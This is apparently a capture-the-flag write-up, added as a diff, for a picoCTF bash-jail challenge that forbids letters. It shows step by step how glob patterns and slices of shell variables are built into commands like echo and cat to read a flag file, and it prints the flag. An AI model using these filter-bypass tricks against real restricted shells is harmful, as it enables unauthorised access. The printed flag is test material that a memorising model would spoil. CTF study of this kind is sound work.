@@ -1,0 +1,80 @@
+"""
+The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.
+Additional details will be available after launching your challenge instance.
+"""
+
+Unsupported characters are: a-z, A-Z and '\'
+
+So, no ascii codes can be used like "\154\163" in octal form for "ls" command.
+
+Available bash syntaxs are file globbing characters, command substitution, variable expansion, process substitution.
+
+Did a lot of experiments and figured out that these commands works:
+
+```
+$ ./**/*
+bash: ./blargh/flag.txt: Permission denied
+
+${-}
+bash: himBHs: command not found
+
+/???/???
+E: Invalid operation /bin/awk
+
+ /???/?${-:5:1} .
+/bin/sh: 1: Bad substitution
+$ 
+```
+
+---
+
+Tools we can use now, 
+1. we can restrict the length of the word
+2. We can specify the path
+3. Use wild cards in a directory
+4. we have 'himBHs' characters available to use. I tried to get characters from other places, but couldn't figure out if there was any other way.
+5. Variable expansion: Eg. $SHELL -> ${SHELL,,} to convert the value into lower case
+
+----
+
+After doing some experiments, I was sucessfully able to run the echo command. 
+
+```
+# /<3 letter directory with 's' as 2nd char>/<3 letter dir>/<4 character command with 'h' as 3rd char>  <all the files and folder in current directory and sub-directory>
+$ /?${-:5:1}?/???/??${-:0:1}? **/*
+> blargh/flag.txt blargh/on-alpha-9.txt
+
+# Ran echo command on home directory
+$ /?${-:5:1}?/???/??${-:0:1}? ~/*
+> /home/ctf-player/blargh /home/ctf-player/flag.txt /home/ctf-player/on-alpha-9.txt /home/ctf-player/on-calastran.txt
+
+# Store the result of echo command in a variable
+$ /?${-:5:1}?/???/??${-:0:1}? ~/*[.]*
+> /home/ctf-player/flag.txt /home/ctf-player/on-alpha-9.txt /home/ctf-player/on-calastran.txt
+```
+
+----
+
+```
+# Use the above variable to generate the cat command
+$ /?${-:5:1}?/???/??${-:0:1}? < "$__"
+> bash: /home/ctf-player/blargh /home/ctf-player/flag.txt /home/ctf-player/on-alpha-9.txt /home/ctf-player/on-calastran.txt: No such file or directory
+
+$ /?${-:5:1}?/???/??${-:0:1}? ${__:5:5}
+> /ctf-
+
+$ ${__:5:10}
+> bash: /ctf-playe: No such file or directory
+
+$ ${__:6:10}
+> bash: ctf-player: command not found
+
+$ ${__:6:1}${__:12:1}${__:7:1} *
+> cat: blargh: Is a directory
+> return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_775ac12d}Alpha-9, a distinctive layer within the Calastran multiverse, stands as a
+```
+
+Flag: picoCTF{7h15_mu171v3r53_15_m4dn355_775ac12d}
+
+
+
